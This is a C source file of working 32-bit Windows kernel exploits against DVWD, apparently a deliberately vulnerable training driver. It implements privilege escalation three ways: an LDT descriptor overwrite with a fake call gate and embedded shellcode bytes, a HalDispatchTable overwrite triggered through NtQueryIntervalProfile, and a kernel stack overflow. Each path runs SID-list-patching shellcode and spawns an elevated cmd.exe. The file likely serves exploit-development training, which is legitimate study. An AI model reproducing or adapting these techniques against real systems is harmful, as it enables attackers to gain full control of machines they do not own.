#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <tchar.h>
#include <Sddl.h>
#include "KernelArch.h"
#include "KernelExploit.h"

/*

ERRATA: 

- CreateUspaceMapping() is now defined into Mapping.c
- all the 32-bit shellcodes are now defined into Shellcode32.c
- RecoveryHandle32() is now defined into Shellcode32.c

*/


/* ARBITRARY OVERWRITE 32-bit */

#if !defined(_M_AMD64)


PVOID FindCurrentEPROCESS()
{
  DWORD ProcessId;
  HANDLE ProcessHandle;
  NTSTATUS retStatus;
  PSYSTEM_HANDLE_INFORMATION handleTable=NULL;
  PSYSTEM_HANDLE_INFORMATION_ENTRY handleEntry=NULL;
  ULONG size,i;

  _NtQuerySystemInformation NtQuerySystemInformation;
  NtQuerySystemInformation = 
    (_NtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll.dll"), 
                                              "NtQuerySystemInformation");

  if(!NtQuerySystemInformation)
    return NULL;

  handleTable = CreateUspaceMapping(10);


  ProcessId = GetCurrentProcessId();
  ProcessHandle = OpenProcess(READ_CONTROL, TRUE, ProcessId);
  if(ProcessHandle == NULL)
    return NULL;


  retStatus = NtQuerySystemInformation(SystemHandleInformation, 
                                       handleTable, 
                                       GlobalInfo.dwAllocationGranularity*10, 
                                       &size);
  
  for(i=0, handleEntry = &(handleTable->Handle[0]); i < handleTable->Count; i++, handleEntry++)
  {
    if(handleEntry->ProcessId == ProcessId && (HANDLE)handleEntry->Handle == ProcessHandle)
    {
      wprintf(L"Get Current Process Handle=%d Object=%p Type=%x\n", 
              handleEntry->Handle, 
              handleEntry->Object,
              handleEntry->ObjectTypeNumber); 
      
      return (PVOID)handleEntry->Object;
    }
  }

  return NULL;
}



typedef enum  _PROCESS_INFORMATION_CLASS { ProcessLdtInformation  = 10 } PROCESS_INFORMATION_CLASS;

#pragma pack (push, 1)
typedef struct _PROCESS_LDT_INFORMATION 
{
  ULONG Start;
  ULONG Length;
  LDT_ENTRY LdtEntries[1];
} PROCESS_LDT_INFORMATION, *PPROCESS_LDT_INFORMATION;
#pragma pack(pop)



typedef NTSTATUS (WINAPI *_ZwSetInformationProcess)(HANDLE ProcessHandle, 
                                           PROCESS_INFORMATION_CLASS ProcessInformationClass,  
                                           PPROCESS_LDT_INFORMATION ProcessInformation,
                                           ULONG ProcessInformationLength);

#pragma pack(push)
#pragma pack(1)     

typedef struct _CALL_GATE32
{
  struct 
  {
    DWORD OffsetLow:16;
    DWORD SegmentSelector:16;
    DWORD Param:5;
    DWORD Reserved1:3;
    DWORD Type:4;
    DWORD Reserved2:1;
    DWORD Dpl:2;
    DWORD Present:1;
    DWORD OffsetHigh:16;
  } Fields;
} CALL_GATE32, *PCALL_GATE32;

#pragma pack(pop) 


/* Fill the fake Gate */
VOID PrepareCallGate32(PCALL_GATE32 pGate, PVOID Payload)
{
  ULONG_PTR IPayload = (ULONG_PTR)Payload;
  
  RtlZeroMemory(pGate, sizeof(CALL_GATE32));
  pGate->Fields.OffsetHigh = (IPayload & 0xFFFF0000) >> 16;
  pGate->Fields.OffsetLow  = (IPayload & 0x0000FFFF);
  pGate->Fields.Type = 12;   // Gate Descriptor
  pGate->Fields.Param = 0;
  pGate->Fields.Present = 1;
  pGate->Fields.SegmentSelector = 1 << 3;  // Kernel Code Segment Selector
  pGate->Fields.Dpl = 3;
}

/* Setup the fake LDT descriptor */


/* LDT Descriptor: 
     07 00 00 30 9d 82 00 85 = base: 00309d85 -> 859d3000 
     07 00 00 30 9d 82 00 85 = base: 859d3000
 */

VOID PrepareLDTDescriptor32(PLDT_ENTRY pLDTDesc, PVOID LDTBasePtr)
{
  ULONG_PTR LDTBase = (ULONG_PTR)LDTBasePtr;

  RtlZeroMemory(pLDTDesc, sizeof(LDT_ENTRY));
  pLDTDesc->BaseLow = LDTBase & 0x0000FFFF;
  pLDTDesc->LimitLow = 0xFFFF;
  pLDTDesc->HighWord.Bits.BaseHi = (LDTBase & 0xFF000000) >> 24;
  pLDTDesc->HighWord.Bits.BaseMid = (LDTBase & 0x00FF0000) >> 16;
  pLDTDesc->HighWord.Bits.Type = 2;
  pLDTDesc->HighWord.Bits.Pres = 1;
}

#define OFFSET_SHELLCODE 18
CHAR ReturnFromGate[]="\x90\x90\x90\x90\x90\x90\x90\x90"
                      "\x60\x0F\xA0"
                      "\x66\xB8\x30\x00"
                      "\x8E\xE0"
                      "\xB8\x41\x41\x41\x41"
                      "\xFF\xD0"
                      "\x0F\xA1"
                      "\x61"
                      "\xcb";

VOID FarCall()
{

    // call far [07h:00h]
   __asm 
   { 
     _emit 0x9A
     _emit 0x00
     _emit 0x00
     _emit 0x00
     _emit 0x00
     _emit 0x07
     _emit 0x00
   }
}


BOOL SetLDTEnv(VOID)
{
  NTSTATUS retStatus;
  LDT_ENTRY eLdt;
  PROCESS_LDT_INFORMATION infoLdt; 
  _ZwSetInformationProcess ZwSetInformationProcess;

  ZwSetInformationProcess = 
    (_ZwSetInformationProcess)GetProcAddress(GetModuleHandle(L"ntdll.dll"), 
                                             "ZwSetInformationProcess");

  if(!ZwSetInformationProcess)
    return FALSE;

  RtlZeroMemory(&eLdt, sizeof(LDT_ENTRY));

  RtlCopyMemory(&(infoLdt.LdtEntries[0]), &eLdt, sizeof(LDT_ENTRY));
  infoLdt.Start = 0;
  infoLdt.Length = sizeof(LDT_ENTRY);

  retStatus = ZwSetInformationProcess(GetCurrentProcess(), 
                                      ProcessLdtInformation, 
                                      &infoLdt, 
                                      sizeof(PROCESS_LDT_INFORMATION));

  if(retStatus != STATUS_SUCCESS)
    return FALSE;

  return TRUE;

}


BOOL OverwriteGDTEntry(ULONG64 LDTDesc, PVOID *KGDTEntry)
{
  HANDLE hFile;
  ARBITRARY_OVERWRITE_STRUCT overwrite;
  ULONG64 storage = LDTDesc;
  BOOL ret;
  DWORD dwReturn;

  hFile = CreateFile(L"\\\\.\\DVWD", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
   
  if(hFile != INVALID_HANDLE_VALUE)
  {
    overwrite.Size = 8;
    overwrite.StorePtr = (PVOID)&storage;
	  ret = DeviceIoControl(hFile, DEVICEIO_DVWD_STORE, &overwrite, 0, NULL, 0, &dwReturn, NULL);

    overwrite.Size = 8;
    overwrite.StorePtr = (PVOID)KGDTEntry;
    ret = DeviceIoControl(hFile, DEVICEIO_DVWD_OVERWRITE, &overwrite, 0, NULL, 0, &dwReturn, NULL);

    CloseHandle(hFile);

    return TRUE;
  }

  return FALSE;
}


#define LDT_DESC_FROM_KPROCESS 0x20
ULONG64 LDTDescStorage32=0;


BOOL LDTDescOverwrite32(VOID)
{
  PVOID kprocess,kprocessLDTDesc;
  PLDT_ENTRY pLDTDesc = (PLDT_ENTRY)&LDTDescStorage32;
  PVOID ReturnFromGateArea = NULL;
  PCALL_GATE32 pGate = NULL;

  /* user standard SIDList Patch */
  FARPROC KernelPayload = (FARPROC)UserShellcodeSIDListPatchCallGate;


  kprocess = FindCurrentEPROCESS();
  if(!kprocess)
    return FALSE;

  kprocessLDTDesc = (PBYTE)kprocess + LDT_DESC_FROM_KPROCESS;
  printf("[--] kprocessLDTDesc found at: %p\n", kprocessLDTDesc);

  if(!SetLDTEnv())
    return FALSE;
  
  /* fixup the Gate Payload and put it into executable memory */
  RtlCopyMemory(ReturnFromGate + OFFSET_SHELLCODE, &KernelPayload, sizeof(FARPROC));
  ReturnFromGateArea = CreateUspaceExecMapping(1);
  RtlCopyMemory(ReturnFromGateArea, ReturnFromGate, sizeof(ReturnFromGate));
  
  /* build the fake-userland LDT */
  pGate = CreateUspaceMapping(1);
  PrepareCallGate32(pGate, (PVOID)ReturnFromGateArea);

  /* build the fake LDT Descriptor */ 
  PrepareLDTDescriptor32(pLDTDesc, (PVOID)pGate);
  
  printf("[--] LDT Descriptor fake: 0x%llx\n", LDTDescStorage32);

  OverwriteGDTEntry(LDTDescStorage32, kprocessLDTDesc);
  Sleep(1000);

  FarCall();

  return TRUE;
}



BOOL TriggerOverwrite32_LDTRemappingWay()
{
  if(LoadAndGetKernelBase() == FALSE)
	  return FALSE;

  if(LDTDescOverwrite32() == TRUE)
  {
      if (CreateChild(_T("C:\\WINDOWS\\SYSTEM32\\CMD.EXE")) != TRUE)
      {
	      wprintf(L"Error: unable to spawn process, Error: %d\n", GetLastError());
	      return FALSE;
      }
  }
  return TRUE;
}



BOOL OverwriteHalDispatchTable(ULONG_PTR HalDispatchTableTarget, ULONG_PTR ShellcodeAddrStorage)
{
  HANDLE hFile;
  BOOL ret;
  DWORD dwReturn;
  ARBITRARY_OVERWRITE_STRUCT overwrite;

  hFile = CreateFile(L"\\\\.\\DVWD", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
   
  if(hFile != INVALID_HANDLE_VALUE)
  {
    overwrite.Size = 4;
    overwrite.StorePtr = (PVOID)&ShellcodeAddrStorage;
	  ret = DeviceIoControl(hFile, DEVICEIO_DVWD_STORE, &overwrite, 0, NULL, 0, &dwReturn, NULL);

    overwrite.Size = 4;
    overwrite.StorePtr = (PVOID)HalDispatchTableTarget;
    ret = DeviceIoControl(hFile, DEVICEIO_DVWD_OVERWRITE, &overwrite, 0, NULL, 0, &dwReturn, NULL);

    CloseHandle(hFile);
    return TRUE;
  }

  return FALSE;  
}



typedef      NTSTATUS (__stdcall *_NtQueryIntervalProfile)(DWORD ProfileSource, PULONG Interval);

BOOL TriggerOverwrite32_NtQueryIntervalProfileWay()
{
  ULONG dummy=0;
  ULONG_PTR HalDispatchTableTarget;
  ULONG_PTR ShellcodeAddrStorage; 

  _NtQueryIntervalProfile NtQueryIntervalProfile;

  if(LoadAndGetKernelBase() == FALSE)
	  return FALSE;

  ShellcodeAddrStorage = (ULONG_PTR)UserShellcodeSIDListPatchUser4Args;
  HalDispatchTableTarget = HalDispatchTable + sizeof(ULONG_PTR);

  NtQueryIntervalProfile  = 
    (_NtQueryIntervalProfile)GetProcAddress(
                GetModuleHandle(L"ntdll.dll"), "NtQueryIntervalProfile");

  
  if(OverwriteHalDispatchTable(HalDispatchTableTarget, ShellcodeAddrStorage) == FALSE)
    return FALSE;

  NtQueryIntervalProfile(2, &dummy);

  if (CreateChild(_T("C:\\WINDOWS\\SYSTEM32\\CMD.EXE")) != TRUE)
  {
	  wprintf(L"Error: unable to spawn process, Error: %d\n", GetLastError());
	  return FALSE;
  }

  return TRUE;
}




/* BUFFER OVERFLOW 32-bit */


#define BUFF_SIZE 64+32
VOID TriggerOverflow32(VOID)   /* this function should not return */
{
  HANDLE hFile;
  DWORD dwReturn;
  UCHAR* map;
  UCHAR *uBuff=NULL;
  BOOL ret;
  ULONG_PTR pShellcode;

  
  if(CreateChild(_T("C:\\WINDOWS\\SYSTEM32\\CMD.EXE")) != TRUE)
  {
	  wprintf(L"Error: unable to spawn process, Error: %d\n", GetLastError());
	  return;
  }

  if(LoadAndGetKernelBase() == FALSE)
	  return;

  map = CreateUspaceMapping(1);
  pShellcode = (ULONG_PTR)UserShellcodeSIDListPatchUserKillMe;
  FillMap(map, pShellcode, GlobalInfo.dwAllocationGranularity);
  uBuff = map + GlobalInfo.dwAllocationGranularity - (BUFF_SIZE-sizeof(ULONG_PTR));
 

  hFile = CreateFile(_T("\\\\.\\DVWD"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
  deviceHandle = hFile; /* kernel need it to recover Objects Table */


  if(hFile != INVALID_HANDLE_VALUE)
	  ret = DeviceIoControl(hFile, DEVICEIO_DVWD_STACKOVERFLOW, uBuff, BUFF_SIZE, NULL, 0, &dwReturn, NULL);
 
  /* If you get here the vulnerability has not been triggered ... */
  wprintf(L"Stack Overflow has not been triggered: maybe the driver has not been loaded?\n");
  return;
}


#endif